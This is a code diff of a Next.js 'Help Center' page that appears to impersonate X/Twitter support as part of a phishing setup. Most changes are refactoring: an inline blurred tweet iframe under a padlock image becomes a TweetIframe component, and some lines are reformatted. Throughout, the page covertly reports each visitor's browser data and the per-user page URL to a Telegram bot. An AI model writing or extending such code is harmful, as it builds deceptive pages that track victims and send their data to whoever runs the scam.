@@ -2,10 +2,11 @@ import { Footer } from "@/components/footer";
 import { XIcon } from "@/components/icons/x";
 import type { Metadata } from "next";
 import { headers } from "next/headers";
-import Image from "next/image";
 import Link from "next/link";
 import { getBrowserData } from "@/helpers/getBrowserData";
 import { sendMessageToTelegramBot } from "@/helpers/send-data-to-telegram";
+import type { TwitterUser } from "@/app/api/twitter/users/route";
+import { TweetIframe } from "@/components/tweet-iframe";
 
 export const metadata: Metadata = {
 	title: "Help Center",
@@ -43,7 +44,7 @@ export default async function HelpCenterPage({ params }: Props) {
 		return `https://twitter.com/user/status/${tweetInfo?.id}`;
 	};
 
-	const headersList = await headers();	
+	const headersList = await headers();
 
 	const baseUrl = getBaseUrl(headersList);
 
@@ -55,7 +56,7 @@ export default async function HelpCenterPage({ params }: Props) {
 
 	const tweetUrl = await getTweetUrl(baseUrl, user);
 
-	getBrowserData(headersList).then(browserData => {
+	getBrowserData(headersList).then((browserData) => {
 		sendMessageToTelegramBot({
 			message: `
 🔛 USER ENTER IN HELP CENTER
@@ -67,8 +68,8 @@ export default async function HelpCenterPage({ params }: Props) {
 🧩 Agent: ${browserData.userAgent}
 
 🌐 SITE: ${baseUrl}/help/${username}
-`
-		})
+`,
+		});
 	});
 
 	return (
@@ -114,21 +115,7 @@ export default async function HelpCenterPage({ params }: Props) {
 				</p>
 
 				<div className="px-6 flex flex-col items-center">
-					<div className="relative w-[270px]">
-						<iframe
-							title=" "
-							src={`https://twitframe.com/show?url=${tweetUrl ?? "https%3A%2F%2Ftwitter.com%2Felonmusk%2Fstatus%2F20"}`}
-							className="w-full h-[100px] border-0 pointer-events-none overflow-hidden blur-sm"
-						/>
-						<Image
-							src="/cadeado.png"
-							alt="Imagem do Cadeado"
-							className="absolute top-5 left-1/2 -translate-x-1/2 size-[100px]"
-							width={100}
-							height={100}
-							priority
-						/>
-					</div>
+					<TweetIframe src={tweetUrl ?? ""} block={!tweetUrl} />
 
 					<div className="flex items-center justify-center px-6 pt-14">
 						<Link
